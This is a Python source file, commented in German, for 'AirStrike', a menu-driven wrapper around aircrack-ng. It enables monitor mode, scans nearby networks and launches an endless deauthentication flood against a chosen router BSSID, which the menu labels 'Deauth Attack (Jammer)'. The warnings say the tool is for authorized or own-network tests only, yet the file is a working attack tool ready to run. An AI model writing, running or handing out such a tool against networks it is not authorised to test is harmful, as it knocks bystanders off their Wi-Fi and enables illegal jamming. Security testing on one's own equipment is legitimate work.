import os
import re
import subprocess
import sys
import time

from colorama import Fore, init

init(autoreset=True)


class AirStrike:
    def __init__(self):
        self.interface = "wlan0"
        self.monitor_interface = None

    def banner(self):
        os.system("cls" if os.name == "nt" else "clear")
        print(f"""{Fore.RED}
    ___    _       _____ __       _ __        
   /   |  (_)_____/ ___// /______(_) /_____   
  / /| | / / ___/\__ \/ __/ ___/ / //_/ _ \  
 / ___ |/ / /   ___/ / /_/ /  / / ,< /  __/  
/_/  |_/_/_/   /____/\__/_/  /_/_/|_|\___/   
                                             
{Fore.WHITE}   >> WIFI MONITOR & DEAUTH TOOL <<
{Fore.YELLOW}   NUR FÜR AUTORISIERTE TESTS!
""")

    def check_aircrack(self):
        """Prüft ob aircrack-ng installiert ist"""
        try:
            result = subprocess.run(["which", "airmon-ng"], capture_output=True, text=True)
            return result.returncode == 0
        except Exception:
            return False

    def get_monitor_interfaces(self):
        """Listet alle Monitor Interfaces auf"""
        try:
            result = subprocess.run(["iwconfig"], capture_output=True, text=True)
            interfaces = []
            for line in result.stdout.split("\n"):
                if "Mode:Monitor" in line:
                    match = re.search(r"^(\w+)\s+", line)
                    if match:
                        interfaces.append(match.group(1))
            return interfaces
        except Exception:
            return []


    def enable_monitor_mode(self):
        print(f"\n{Fore.YELLOW}[*] Schalte {self.interface} in Monitor Mode...")

        if not self.check_aircrack():
            print(f"{Fore.RED}[ERROR] aircrack-ng ist nicht installiert!")
            print(f"{Fore.YELLOW}Installiere mit: sudo apt install aircrack-ng")
            return

        try:
            print(f"{Fore.WHITE}[1/3] Störende Prozesse killen...")
            subprocess.run(["sudo", "airmon-ng", "check", "kill"], capture_output=True)

            print(f"{Fore.WHITE}[2/3] Starte Monitor Mode...")
            result = subprocess.run(
                ["sudo", "airmon-ng", "start", self.interface], capture_output=True, text=True
            )

            # Extrahiere neuen Interface-Namen
            for line in result.stdout.split("\n"):
                if "monitor mode" in line.lower() and "enabled" in line.lower():
                    match = re.search(r"on\s+(\w+)", line)
                    if match:
                        self.monitor_interface = match.group(1)
                        break

            if not self.monitor_interface:
                # Fallback: Liste alle Interfaces
                monitor_ifaces = self.get_monitor_interfaces()
                if monitor_ifaces:
                    self.monitor_interface = monitor_ifaces[0]
                else:
                    self.monitor_interface = f"{self.interface}mon"

            print(f"{Fore.GREEN}[+] Monitor Mode aktiv! (Interface: {self.monitor_interface})")

        except Exception as e:
            print(f"{Fore.RED}[ERROR] Konnte Monitor Mode nicht starten: {e}")

    def scan_networks(self):
        if not self.monitor_interface:
            print(f"{Fore.RED}[ERROR] Kein Monitor Interface gefunden!")
            print(f"{Fore.YELLOW}Bitte erst Monitor Mode aktivieren!")
            return

        print(f"\n{Fore.CYAN}[INFO] Starte Scan... (Drücke STRG+C zum Stoppen)")
        print(f"{Fore.YELLOW}[TIP] Scanne 5-10 Sekunden für beste Ergebnisse")
        time.sleep(2)

        try:
            # airodump-ng zeigt alle Netzwerke an
            os.system(f"sudo airodump-ng {self.monitor_interface}")
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[*] Scan gestoppt.")

    def deauth_attack(self):
        if not self.monitor_interface:
            print(f"{Fore.RED}[ERROR] Kein Monitor Interface gefunden!")
            print(f"{Fore.YELLOW}Bitte erst Monitor Mode aktivieren!")
            return

        print(f"\n{Fore.RED}[!!!] DEAUTH ATTACK - VERBINDUNGEN TRENNEN [!!!]")
        print(f"{Fore.YELLOW}WARNUNG: Nur auf eigenen Netzwerken testen!")

        bssid = input(f"{Fore.WHITE}Ziel-BSSID (Router MAC, z.B. AA:BB:CC:DD:EE:FF): ").strip()
        channel = input(f"{Fore.WHITE}Kanal (Channel, 1-14): ").strip()

        if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid):
            print(f"{Fore.RED}[ERROR] Ungültige MAC-Adresse!")
            return

        if not channel.isdigit() or not (1 <= int(channel) <= 14):
            print(f"{Fore.RED}[ERROR] Ungültiger Kanal!")
            return

        # Erst Kanal setzen
        print(f"{Fore.WHITE}[*] Setze Kanal {channel}...")
        os.system(f"sudo iwconfig {self.monitor_interface} channel {channel}")

        print(f"{Fore.RED}[!] Feuere Deauth-Pakete... (STRG+C zum Stoppen)")
        print(f"{Fore.YELLOW}Attacke läuft. Drücke STRG+C zum Beenden.")

        try:
            # aireplay-ng sendet "Disconnect" Befehle
            os.system(f"sudo aireplay-ng --deauth 0 -a {bssid} {self.monitor_interface}")
        except KeyboardInterrupt:
            print(f"\n{Fore.GREEN}[*] Attacke gestoppt.")

    def disable_monitor_mode(self):
        """Setzt Interface zurück zu Managed Mode"""
        if self.monitor_interface:
            print(f"\n{Fore.YELLOW}[*] Setze {self.monitor_interface} zurück zu Managed Mode...")
            os.system(f"sudo airmon-ng stop {self.monitor_interface}")
            self.monitor_interface = None
            print(f"{Fore.GREEN}[+] Interface zurückgesetzt.")

    def run(self):
        self.banner()

        if os.geteuid() != 0:
            print(f"{Fore.RED}[ERROR] Muss als Root (sudo) ausgeführt werden!")
            sys.exit(1)

        print(f"{Fore.WHITE}Interface aktuell: {Fore.YELLOW}{self.interface}")
        if self.monitor_interface:
            print(f"{Fore.WHITE}Monitor Interface: {Fore.GREEN}{self.monitor_interface}")

        print(f"\n{Fore.WHITE}[1] Enable Monitor Mode")
        print(f"{Fore.WHITE}[2] Scan Networks (Airodump)")
        print(f"{Fore.WHITE}[3] Deauth Attack (Jammer)")
        print(f"{Fore.WHITE}[4] Disable Monitor Mode")
        print(f"{Fore.WHITE}[5] Change Interface (Aktuell: {self.interface})")

        choice = input(f"\n{Fore.YELLOW}[?] Auswahl: ")

        if choice == "1":
            self.enable_monitor_mode()
        elif choice == "2":
            self.scan_networks()
        elif choice == "3":
            self.deauth_attack()
        elif choice == "4":
            self.disable_monitor_mode()
        elif choice == "5":
            new_iface = input("Neues Interface (z.B. wlan0): ")
            if new_iface:
                self.interface = new_iface
                self.monitor_interface = None

        input("\n[ENTER] Zurück...")


if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Muss als ROOT laufen!")
    else:
        tool = AirStrike()
        while True:
            tool.run()
